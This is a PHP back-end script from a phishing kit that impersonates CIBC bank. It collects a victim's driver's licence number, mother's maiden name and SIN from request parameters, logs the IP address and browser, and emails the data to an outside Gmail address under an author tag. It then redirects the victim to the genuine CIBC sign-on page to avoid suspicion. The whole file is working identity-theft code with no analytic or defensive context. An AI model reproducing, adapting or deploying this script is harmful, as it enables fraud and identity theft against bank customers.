<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;




#Security information

$_SESSION['driverslicense'] = $_GET['1'];
$_SESSION['MMN'] = $_GET['2'];
$_SESSION['SIN'] = $_GET['3'];


$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
Drivers license:  =>   <font color='#F31414'>".$_GET['1']."</font><br />
MMN :  =>   <font color='#F31414'>".$_GET['2']."</font><br />
SIN code    =>   <font color='#F31414'>".$_GET['3']."</font><br />
___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$subject  = " CIBC :  Billing / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-Int" . "\r\n";
$to = "goodvbesk1@gmail.com";
@mail($to,$subject,$message,$headers);

 
 header("location: https://www.cibconline.cibc.com/olbtxn/authentication/PreSignOn.cibc?locale=en_CA".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        
		  
		  
		  ?>